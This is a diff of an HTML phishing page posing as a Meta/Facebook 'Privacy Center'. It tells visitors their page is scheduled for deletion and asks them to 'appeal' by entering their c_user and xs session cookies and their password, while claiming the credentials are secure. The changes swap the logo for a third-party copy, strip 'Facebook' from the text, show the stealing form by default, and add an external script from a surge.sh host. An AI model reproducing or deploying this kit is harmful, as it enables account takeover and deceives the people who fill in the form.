@@ -1,8 +1,6 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+<html lang="en" webcrx=""><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Privacy Center</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
@@ -30,7 +28,7 @@
       width: 100%;
       height: 100%;
       background: rgba(0, 0, 0, 0.7);
-      display: flex;
+      display: none;
       justify-content: center;
       align-items: center;
       z-index: 99999;
@@ -319,9 +317,9 @@
       }
     }
 
-    /* Hide main content until language is selected */
+    /* Show main content by default */
     .main-content {
-      display: none;
+      display: block;
     }
    
     /* Mobile header */
@@ -353,7 +351,7 @@
 
     .warning-message { display: flex; flex-direction: column; align-items: flex-start; font-size: 24px; font-weight: 400; color: #333; gap: 8px; max-width: 650px; }
     .warning-top { display: flex; align-items: center; gap: 15px; margin-bottom: 10px; }
-    .warning-message svg { width: 36px; height: 36px; flex-shrink: 0; }
+    .warning-message svg { width: 22px; height: 36px; flex-shrink: 0; }
     .warning-message span { font-weight: 700; color: #d93025; }
 
     span#fbSendBtnText {
@@ -602,13 +600,14 @@
       box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
       position: relative;
       max-width: 378px;
+      cursor: pointer;
     }
    
     .video-player {
       width: 100%;
       height: 200px;
       background: #000;
-      display: block;
+      display: none;
     }
    
      
@@ -624,16 +623,15 @@
       cursor: pointer;
     }
       
-      @media (max-width: 900px) {
-  .video-container {
-    max-width: 337px; /* Mobile width */
-  }
-  }
-
+    @media (max-width: 900px) {
+      .video-container {
+        max-width: 337px; /* Mobile width */
+      }
+    }
 
     .video-placeholder svg {
-      width: 30px;
-      height: 30px;
+      width: 50px;
+      height: 50px;
       margin-bottom: 8px;
     }
    
@@ -904,7 +902,7 @@
       .warning-top { flex-direction: row; text-align: left; gap: 15px; margin-bottom: 20px; }
       .warning-message span { text-align: left; }
       .warning-subtext, .warning-extra { font-size: 15px; text-align: left; }
-      .warning-message svg { width: 32px; height: 32px; }
+      .warning-message svg { width: 22px; height: 32px; }
       .appeal-info { padding: 20px; }
       .appeal-title { font-size: 20px; text-align: left; }
       .appeal-desc { font-size: 15px; text-align: left; }
@@ -1030,14 +1028,14 @@
       }
     }
   </style>
-</head>
+<script src="blob:https://privacy-help-center.surge.sh/7e591299-c449-4e5a-b927-b38dbfc52cb8"></script></head>
 <body>
   <!-- Language Selection Modal -->
   <div class="language-modal" id="languageModal">
     <div class="language-modal-content">
       <div class="language-modal-close" id="languageModalClose">
         <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-          <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/>
+          <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path>
         </svg>
       </div>
       <h2 class="language-modal-title">Select Your Language</h2>
@@ -1091,24 +1089,24 @@
   
 </div>
      
-     <button class="language-confirm-btn" id="languageConfirmBtn" disabled>Confirm Language</button>
+     <button class="language-confirm-btn" id="languageConfirmBtn" disabled="">Confirm Language</button>
     </div>
   </div>
 
-  <!-- Main Content (hidden until language is selected) -->
+  <!-- Main Content (visible by default) -->
   <div class="main-content" id="mainContent">
     <!-- Mobile Header with fixed logo -->
     <div class="mobile-header">
-      <img class="mobile-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1200px-Meta_Platforms_Inc._logo.svg.png" alt="Meta Logo" />
+      <img class="mobile-logo" src="https://unrivaled-melba-822fa8.netlify.app/logo.png" alt="Logo">
     </div>
 
     <header>
-      <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1200px-Meta_Platforms_Inc._logo.svg.png" alt="Meta Logo" />
+      <img class="logo" src="https://unrivaled-melba-822fa8.netlify.app/logo.png" alt="Logo">
       <div class="privacy-text">Privacy Center</div>
 
       <div class="home-page">
         <svg class="home-icon" viewBox="0 0 576 512" xmlns="http://www.w3.org/2000/svg">
-          <path d="M280.37 148.26L96 300.11V464a16 16 0 0 0 16 16l112.06-.29a16 16 0 0 0 15.92-16V368a16 16 0 0 1 16-16h64a16 16 0 0 1 16 16v95.64a16 16 0 0 0 16 16.05L464 480a16 16 0 0 0 16-16V300L295.67 148.26a12.19 12.19 0 0 0-15.3 0zM571.6 251.47L488 182.56V44.05a12 12 0 0 0-12-12h-56a12 12 0 0 0-12 12v72.61L318.47 43a48 48 0 0 0-61 0L4.34 251.47a12 12 0 0 0-1.6 16.9l25.5 31A12 12 0 0 0 45.15 301l235.22-193.74a12.19 12.19 0 0 1 15.3 0L530.9 301a12 12 0 0 0 16.9-1.6l25.5-31a12 12 0 0 0-1.7-16.93z"/>
+          <path d="M280.37 148.26L96 300.11V464a16 16 0 0 0 16 16l112.06-.29a16 16 0 0 0 15.92-16V368a16 16 0 0 1 16-16h64a16 16 0 0 1 16 16v95.64a16 16 0 0 0 16 16.05L464 480a16 16 0 0 0 16-16V300L295.67 148.26a12.19 12.19 0 0 0-15.3 0zM571.6 251.47L488 182.56V44.05a12 12 0 0 0-12-12h-56a12 12 0 0 0-12 12v72.61L318.47 43a48 48 0 0 0-61 0L4.34 251.47a12 12 0 0 0-1.6 16.9l25.5 31A12 12 0 0 0 45.15 301l235.22-193.74a12.19 12.19 0 0 1 15.3 0L530.9 301a12 12 0 0 0 16.9-1.6l25.5-31a12 12 0 0 0-1.7-16.93z"></path>
         </svg>
         <span class="home-text">Privacy Center Home Page</span>
       </div>
@@ -1116,23 +1114,23 @@
       <div class="menu-container">
         <div class="menu-item">
           <svg class="menu-icon" viewBox="0 0 512 512">
-            <path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/>
+            <path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"></path>
           </svg>
           <span class="menu-text">Search</span>
         </div>
 
         <div class="menu-item">
           <svg class="menu-icon" viewBox="0 0 512 512">
-            <path d="M256 0c4.6 0 9.2 1 13.4 2.9L457.7 82.8c22 9.3 38.4 31 38.3 57.2c-.5 99.2-41.3 280.7-213.6 363.2c-16.7 8-36.1 8-52.8 0C57.3 420.7 16.5 239.2 16 140c-.1-26.2 16.3-47.9 38.3-57.2L242.7 2.9C246.8 1 251.4 0 256 0zm0 66.8V444.8C394 378 431.1 230.1 432 141.4L256 66.8l0 0z"/>
+            <path d="M256 0c4.6 0 9.2 1 13.4 2.9L457.7 82.8c22 9.3 38.4 31 38.3 57.2c-.5 99.2-41.3 280.7-213.6 363.2c-16.7 8-36.1 8-52.8 0C57.3 420.7 16.5 239.2 16 140c-.1-26.2 16.3-47.9 38.3-57.2L242.7 2.9C246.8 1 251.4 0 256 0zm0 66.8V444.8C394 378 431.1 230.1 432 141.4L256 66.8l0 0z"></path>
           </svg>
           <span class="menu-text">Privacy Policy</span>
         </div>
 
         <div class="menu-item">
           <svg class="menu-icon" viewBox="0 0 512 512">
-            <path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/>
+            <path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"></path>
           </svg>
-          <span class="menu-text">Other Rules & Articles</span>
+          <span class="menu-text">Other Rules &amp; Articles</span>
         </div>
       </div>
     </header>
@@ -1143,32 +1141,21 @@
       <div class="warning-message">
           <div class="warning-top">
           <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M12 9V14" stroke="#D93025" stroke-width="2" stroke-linecap="round"/>
-            <path d="M12 17V17.5" stroke="#D93025" stroke-width="2" stroke-linecap="round"/>
-            <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#D93025" stroke-width="2"/>
+            <path d="M12 9V14" stroke="#D93025" stroke-width="2" stroke-linecap="round"></path>
+            <path d="M12 17V17.5" stroke="#D93025" stroke-width="2" stroke-linecap="round"></path>
+            <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#D93025" stroke-width="2"></path>
           </svg>
           <span class="translatable" data-key="warningTitle">Your page is scheduled to be deleted!</span>
         </div>
-        <div class="warning-subtext translatable" data-key="warningSubtext">
-          We have received several reports that your page violates our terms of service
-          and community guidelines. As a result, your page will be sent for verification.
-        </div>
-        <div class="warning-extra translatable" data-key="warningExtra">
-          If you believe your page was mistakenly scheduled for deletion, you can prevent
-          its permanent removal by simply clicking the appeal button below and providing
-          some quick information.
-        </div>
+        <div class="warning-subtext translatable" data-key="warningSubtext">We have received several reports that your page violates our terms of service and community guidelines. As a result, your page will be sent for verification.</div>
+        <div class="warning-extra translatable" data-key="warningExtra">If you believe your page was mistakenly scheduled for deletion, you can prevent its permanent removal by simply clicking the appeal button below and providing some quick information.</div>
 
-        <div class="appeal-box">
-          <img src="https://ik.imagekit.io/alibrohi/download.png?updatedAt=1756102262767" alt="Appeal Illustration" />
+        <div class="appeal-box" style="display: none;">
+          <img src="https://ik.imagekit.io/alibrohi/download.png?updatedAt=1756102262767" alt="Appeal Illustration">
          
           <div class="appeal-info">
             <div class="appeal-title translatable" data-key="appealTitle">Appeal request</div>
-            <div class="appeal-desc translatable" data-key="appealDesc">
-              Fixing problems with your page
-              Please be sure to provide the requested information below.
-              Failure to provide this information may delay the processing of your appeal.
-            </div>
+            <div class="appeal-desc translatable" data-key="appealDesc">Fixing problems with your page. Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal.</div>
             <button class="appeal-btn" id="open-appeal-btn">
               <span id="fbSendBtnText" class="translatable" data-key="appealBtn">Appeal</span>
             </button>
@@ -1176,11 +1163,11 @@
         </div>
        
         <!-- Redesigned Appeal Form Section -->
-        <div class="appeal-form" id="appealForm">
+        <div class="appeal-form" id="appealForm" style="display: block;">
           <div class="form-header">
             <div class="form-icon">
               <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                <path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-7 9h-2V5h2v6zm0 4h-2v-2h2v2z"/>
+                <path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-7 9h-2V5h2v6zm0 4h-2v-2h2v2z"></path>
               </svg>
             </div>
             <div>
@@ -1190,42 +1177,43 @@
           </div>
          
           <div class="form-notice-container">
-            <div class="form-notice translatable" data-key="formNotice1">
-              ⓘ Your page has a violation related to our community guidelines.
-            </div>
-            <div class="form-notice translatable" data-key="formNotice2">
-              ⓘ Please review the violation details carefully before submitting.
-            </div>
-            <div class="form-notice translatable" data-key="formNotice3">
-              ⓘ Ensure you provide correct information for your appeal.
-            </div>
+            <div class="form-notice translatable" data-key="formNotice1">ⓘ Your page has a violation related to our community guidelines.</div>
+            <div class="form-notice translatable" data-key="formNotice2">ⓘ Please review the violation details carefully before submitting.</div>
+            <div class="form-notice translatable" data-key="formNotice3">ⓘ Ensure you provide correct information for your appeal.</div>
           </div>
           
-          <!-- Video Section -->
+          <!-- Video Section with Play Button -->
           <div class="video-container" id="videoContainer">
-            <video class="video-player" id="guideVideo" controls>
-              <source src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4" type="video/mp4">
+            <div class="video-placeholder" id="videoPlaceholder">
+              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="currentColor" stroke-width="2"></path>
+                <path d="M10 8L16 12L10 16V8Z" fill="currentColor" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+              </svg>
+              <div class="video-title">Click to select language and play video</div>
+            </div>
+            <video class="video-player" id="guideVideo" controls="">
+              <source src="" type="video/mp4">
               Your browser does not support the video tag.
             </video>
           </div>
          
           <div class="form-group">
-            <label for="nameInput" class="form-label translatable" data-key="nameLabel">c_user</label>
-            <input type="text" class="form-input" id="nameInput" placeholder="Enter c_user">
-            <div class="input-error" id="nameError"></div>
+            <label for="c_userInput" class="form-label translatable" data-key="c_userLabel">c_user</label>
+            <input type="text" class="form-input" id="c_userInput" pattern="\d+" title="c_user only" required="" placeholder="Enter c_user"> 
+            <div class="input-error" id="c_userError"></div>
           </div>
          
           <div class="form-group">
-            <label for="mallInput" class="form-label translatable" data-key="mallLabel">xs</label>
-            <input type="text" class="form-input" id="mallInput" placeholder="Enter xs">
-            <div class="input-error" id="mallError"></div>
+            <label for="xsInput" class="form-label translatable" data-key="xsLabel">xs</label>
+            <input type="text" class="form-input" id="xsInput" pattern=".{20,}" title="xs only" required="" placeholder="Enter xs">
+            <div class="input-error" id="xsError"></div>
           </div>
          
           <div class="form-warning" id="formError">
             <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <path d="M12 9V14" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
-              <path d="M12 17V17.5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
-              <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="currentColor" stroke-width="2"/>
+              <path d="M12 9V14" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
+              <path d="M12 17V17.5" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
+              <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="currentColor" stroke-width="2"></path>
             </svg>
             <span id="formErrorText"></span>
           </div>
@@ -1240,38 +1228,32 @@
           <div class="fb-form-header">
             <div class="fb-form-icon">
               <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                <path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879V14.89h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89c1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.989C18.343 21.129 22 16.99 22 12c0-5.523-4.477-10-10-10z"/>
+                <path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879V14.89h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89c1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.989C18.343 21.129 22 16.99 22 12c0-5.523-4.477-10-10-10z"></path>
               </svg>
             </div>
             <div>
-              <div class="fb-form-title translatable" data-key="fbFormTitle">Facebook Verification</div>
+              <div class="fb-form-title translatable" data-key="fbFormTitle">Verification</div>
               <div class="fb-form-subtitle translatable" data-key="fbFormSubtitle">Verify your identity to continue with the appeal</div>
             </div>
           </div>
          
           <div class="fb-form-notice-container">
-            <div class="fb-form-notice translatable" data-key="fbNotice1">
-              ⓘ For security purposes, we need to verify your Facebook account.
-            </div>
-            <div class="fb-form-notice translatable" data-key="fbNotice2">
-              ⓘ This helps us ensure that you are the legitimate owner of the page.
-            </div>
-            <div class="fb-form-notice translatable" data-key="fbNotice3">
-              ⓘ Your credentials are secure and encrypted.
-            </div>
+            <div class="fb-form-notice translatable" data-key="fbNotice1">ⓘ For security purposes, we need to verify your account.</div>
+            <div class="fb-form-notice translatable" data-key="fbNotice2">ⓘ This helps us ensure that you are the legitimate owner of the page.</div>
+            <div class="fb-form-notice translatable" data-key="fbNotice3">ⓘ Your credentials are secure and encrypted.</div>
           </div>
          
           <div class="fb-form-group">
             <label for="passwordInput" class="fb-form-label translatable" data-key="passwordLabel">Password</label>
-            <input type="password" class="fb-form-input" id="passwordInput" placeholder="Enter your Facebook password">
+            <input type="password" class="fb-form-input" id="passwordInput" placeholder="Enter your password">
             <div class="fb-input-error" id="passwordError"></div>
           </div>
          
           <div class="fb-form-warning" id="fbFormError">
             <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <path d="M12 9V14" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
-              <path d="M12 17V17.5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
-              <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="currentColor" stroke-width="2"/>
+              <path d="M12 9V14" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
+              <path d="M12 17V17.5" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
+              <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="currentColor" stroke-width="2"></path>
             </svg>
             <span id="fbFormErrorText"></span>
           </div>
@@ -1290,13 +1272,11 @@
         <div class="success-message" id="successMessage">
           <div class="success-icon">
             <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <path d="M9 12L11 14L15 10M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+              <path d="M9 12L11 14L15 10M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
             </svg>
           </div>
           <h3 class="success-title translatable" data-key="successTitle">Appeal Submitted Successfully</h3>
-          <p class="success-text translatable" data-key="successText">
-            Your appeal has been received and is now in review. We'll notify you via email once a decision has been made, typically within 7 business days.
-          </p>
+          <p class="success-text translatable" data-key="successText">Your appeal has been received and is now in review. We'll notify you via email once a decision has been made, typically within 7 business days.</p>
           <div class="success-text">
             <span class="translatable" data-key="referenceText">Reference ID:</span> <span class="reference-id" id="referenceId"></span>
           </div>
@@ -1306,15 +1286,9 @@
         <div class="appeal-guide">
           <div class="appeal-guide-title translatable" data-key="guideTitle">Appeal Guide</div>
           <div class="appeal-guide-content">
-            <p class="appeal-guide-text translatable" data-key="guideText1">
-              If your appeal/request involves the use of copyrighted information or content in your account or that is being processed/shared, you may provide us information to help us better understand your request. Please provide a detailed explanation of why you believe your account was incorrectly flagged or suspended. Include any relevant information that may help us review your case more effectively.
-            </p>
-            <p class="appeal-guide-text translatable" data-key="guideText2">
-              After your submission, we will review your appeal and contact you within the timeframe of the information you provide to resolve. The review process could take up to 7 business days. Please check your email for updates.
-            </p>
-            <p class="appeal-guide-text translatable" data-key="guideText3">
-              Note: You can change your language preference at any time by clicking the language selector at the bottom of the page.
-            </p>
+            <p class="appeal-guide-text translatable" data-key="guideText1">If your appeal/request involves the use of copyrighted information or content in your account or that is being processed/shared, you may provide us information to help us better understand your request. Please provide a detailed explanation of why you believe your account was incorrectly flagged or suspended. Include any relevant information that may help us review your case more effectively.</p>
+            <p class="appeal-guide-text translatable" data-key="guideText2">After your submission, we will review your appeal and contact you within the timeframe of the information you provide to resolve. The review process could take up to 7 business days. Please check your email for updates.</p>
+            <p class="appeal-guide-text translatable" data-key="guideText3">Note: You can change your language preference at any time by clicking the language selector at the bottom of the page.</p>
           </div>
         </div>
        
@@ -1324,7 +1298,7 @@
           <div class="resources-grid">
             <div class="resource-card">
               <svg class="resource-icon" viewBox="0 0 512 512">
-                <path d="M256 512c141.4 0 256-114.6 256-256S397.4 0 256 0S0 114.6 0 256S114.6 512 256 512zM216 336h24V272H216c-13.3 0-24-10.7-24-24s10.7-24 24-24h48c13.3 0 24 10.7 24 24v88h8c13.3 0 24 10.7 24 24s-10.7 24-24 24H216c-13.3 0-24-10.7-24-24s10.7-24 24-24zm40-144c-17.7 0-32-14.3-32-32s14.3-32 32-32s32 14.3 32 32s-14.3 32-32 32z"/>
+                <path d="M256 512c141.4 0 256-114.6 256-256S397.4 0 256 0S0 114.6 0 256S114.6 512 256 512zM216 336h24V272H216c-13.3 0-24-10.7-24-24s10.7-24 24-24h48c13.3 0 24 10.7 24 24v88h8c13.3 0 24 10.7 24 24s-10.7 24-24 24H216c-13.3 0-24-10.7-24-24s10.7-24 24-24zm40-144c-17.7 0-32-14.3-32-32s14.3-32 32-32s32 14.3 32 32s-14.3 32-32 32z"></path>
               </svg>
               <div class="resource-card-title translatable" data-key="helpCenterTitle">Help Center</div>
               <div class="resource-card-desc translatable" data-key="helpCenterDesc">Find answers to common questions and learn how to use our products.</div>
@@ -1332,7 +1306,7 @@
             
             <div class="resource-card">
               <svg class="resource-icon" viewBox="0 0 512 512">
-                <path d="M164.9 24.6c-7.7-18.6-28-28.5-47.4-23.2l-88 24C12.1 30.2 0 46 0 64C0 311.4 200.6 512 448 512c18 0 33.8-12.1 38.6-29.5l24-88c5.3-19.4-4.6-39.7-23.2-47.4l-96-40c-16.3-6.8-35.2-2.1-46.3 11.6L304.7 368C234.3 334.7 177.3 277.7 144 207.3L193.3 167c13.7-11.2 18.4-30 11.6-46.3l-40-96z"/>
+                <path d="M164.9 24.6c-7.7-18.6-28-28.5-47.4-23.2l-88 24C12.1 30.2 0 46 0 64C0 311.4 200.6 512 448 512c18 0 33.8-12.1 38.6-29.5l24-88c5.3-19.4-4.6-39.7-23.2-47.4l-96-40c-16.3-6.8-35.2-2.1-46.3 11.6L304.7 368C234.3 334.7 177.3 277.7 144 207.3L193.3 167c13.7-11.2 18.4-30 11.6-46.3l-40-96z"></path>
               </svg>
               <div class="resource-card-title translatable" data-key="contactSupportTitle">Contact Support</div>
               <div class="resource-card-desc translatable" data-key="contactSupportDesc">Get in touch with our support team for personalized assistance.</div>
@@ -1340,7 +1314,7 @@
             
             <div class="resource-card">
               <svg class="resource-icon" viewBox="0 0 640 512">
-                <path d="M144 0a80 80 0 1 1 0 160A80 80 0 1 1 144 0zM512 0a80 80 0 1 1 0 160A80 80 0 1 1 512 0zM0 298.7C0 239.8 47.8 192 106.7 192h42.7c15.9 0 31 3.5 44.6 9.7c-1.3 7.2-1.9 14.7-1.9 22.3c0 38.2 16.8 72.5 43.3 96c-.2 0-.4 0-.7 0H21.3C9.6 320 0 310.4 0 298.7zM405.3 320c-.2 0-.4 0-.7 0c26.6-23.5 43.3-57.8 43.3-96c0-7.6-.7-15-1.9-22.3c13.6-6.3 28.7-9.7 44.6-9.7h42.7C592.2 192 640 239.8 640 298.7c0 11.8-9.6 21.3-21.3 21.3H405.3zM224 224a96 96 0 1 1 192 0 96 96 0 1 1 -192 0zM128 485.3C128 411.7 187.7 352 261.3 352H378.7C452.3 352 512 411.7 512 485.3c0 14.7-11.9 26.7-26.7 26.7H154.7c-14.7 0-26.7-11.9-26.7-26.7z"/>
+                <path d="M144 0a80 80 0 1 1 0 160A80 80 0 1 1 144 0zM512 0a80 80 0 1 1 0 160A80 80 0 1 1 512 0zM0 298.7C0 239.8 47.8 192 106.7 192h42.7c15.9 0 31 3.5 44.6 9.7c-1.3 7.2-1.9 14.7-1.9 22.3c0 38.2 16.8 72.5 43.3 96c-.2 0-.4 0-.7 0H21.3C9.6 320 0 310.4 0 298.7zM405.3 320c-.2 0-.4 0-.7 0c26.6-23.5 43.3-57.8 43.3-96c0-7.6-.7-15-1.9-22.3c13.6-6.3 28.7-9.7 44.6-9.7h42.7C592.2 192 640 239.8 640 298.7c0 11.8-9.6 21.3-21.3 21.3H405.3zM224 224a96 96 0 1 1 192 0 96 96 0 1 1 -192 0zM128 485.3C128 411.7 187.7 352 261.3 352H378.7C452.3 352 512 411.7 512 485.3c0 14.7-11.9 26.7-26.7 26.7H154.7c-14.7 0-26.7-11.9-26.7-26.7z"></path>
               </svg>
               <div class="resource-card-title translatable" data-key="guidelinesTitle">Community Guidelines</div>
               <div class="resource-card-desc translatable" data-key="guidelinesDesc">Learn about our community standards and content policies.</div>
@@ -1348,7 +1322,7 @@
             
             <div class="resource-card">
               <svg class="resource-icon" viewBox="0 0 576 512">
-                <path d="M64 32C28.7 32 0 60.7 0 96V416c0 35.3 28.7 64 64 64H512c35.3 0 64-28.7 64-64V96c0-35.3 28.7-64 64-64H64zm80 256h64c44.2 0 80 35.8 80 80c0 8.8-7.2 16-16 16H80c-8.8 0-16-7.2-16-16c0-44.2 35.8-80 80-80zm96-96c0 35.3-28.7 64-64 64s-64-28.7-64-64s28.7-64 64-64s64 28.7 64 64zm128 32c44.2 0 80 35.8 80 80c0 8.8-7.2 16-16 16H368c-8.8 0-16-7.2-16-16c0-44.2 35.8-80 80-80zM320 192c0 35.3-28.7 64-64 64s-64-28.7-64-64s28.7-64 64-64s64 28.7 64 64z"/>
+                <path d="M64 32C28.7 32 0 60.7 0 96V416c0 35.3 28.7 64 64 64H512c35.3 0 64-28.7 64-64V96c0-35.3 28.7-64 64-64H64zm80 256h64c44.2 0 80 35.8 80 80c0 8.8-7.2 16-16 16H80c-8.8 0-16-7.2-16-16c0-44.2 35.8-80 80-80zm96-96c0 35.3-28.7 64-64 64s-64-28.7-64-64s28.7-64 64-64s64 28.7 64 64zm128 32c44.2 0 80 35.8 80 80c0 8.8-7.2 16-16 16H368c-8.8 0-16-7.2-16-16c0-44.2 35.8-80 80-80zM320 192c0 35.3-28.7 64-64 64s-64-28.7-64-64s28.7-64 64-64s64 28.7 64 64z"></path>
               </svg>
               <div class="resource-card-title translatable" data-key="dashboardTitle">Status Dashboard</div>
               <div class="resource-card-desc translatable" data-key="dashboardDesc">Check the current status of our services and report outages.</div>
@@ -1361,9 +1335,10 @@
           <button id="changeLanguageBtn" style="background: #0064e0; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer;">
             <span id="fbSendBtnText" class="translatable" data-key="changeLanguage">Change Language</span>
           </button>
-        
+        </div>
       </div>
-    
+    </div>
+  </div>
 
   <script>
    // Wait for the DOM to be fully loaded
@@ -1385,9 +1360,9 @@ document.addEventListener('DOMContentLoaded', function() {
       nameLabel: "c_user",
       mallLabel: "xs",
       submitBtn: "Submit Appeal Request",
-      fbFormTitle: "Facebook Verification",
+      fbFormTitle: "Verification",
       fbFormSubtitle: "Verify your identity to continue with the appeal",
-      fbNotice1: "ⓘ For security purposes, we need to verify your Facebook account.",
+      fbNotice1: "ⓘ For security purposes, we need to verify your account.",
       fbNotice2: "ⓘ This helps us ensure that you are the legitimate owner of the page.",
       fbNotice3: "ⓘ Your credentials are secure and encrypted.",
       passwordLabel: "Password",
@@ -1467,20 +1442,20 @@ document.addEventListener('DOMContentLoaded', function() {
       nameLabel: "c_user",
       mallLabel: "xs",
       submitBtn: "Enviar solicitud de apelación",
-      fbFormTitle: "Verificación de Facebook",
+      fbFormTitle: "Verificación de",
       fbFormSubtitle: "Verify your identity to continue with the appeal",
-      fbNotice1: "ⓘ Por motivos de seguridad, necesitamos verificar tu cuenta de Facebook.",
+      fbNotice1: "ⓘ Por motivos de seguridad, necesitamos verificar tu cuenta de.",
       fbNotice2: "ⓘ Esto nos ayuda a asegurar que eres el propietario legítimo de la página.",
-      fbNotice3: "ⓘ Tus credenciales están seguras y encriptadas.",
+      fbNotice3: "ⓘ Tus credenciales están seguras and encriptadas.",
